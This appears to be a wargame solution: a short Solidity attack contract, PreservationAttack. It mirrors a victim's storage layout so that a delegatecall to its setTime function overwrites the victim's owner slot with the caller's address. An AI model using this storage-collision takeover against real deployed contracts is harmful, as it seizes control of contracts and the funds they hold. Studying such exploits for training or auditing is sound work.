// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttack {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 

  function setTime(uint _time) public {
    owner = msg.sender; // we can set it to msg.sender, because delegate call forwards the msg.sender
  }
}
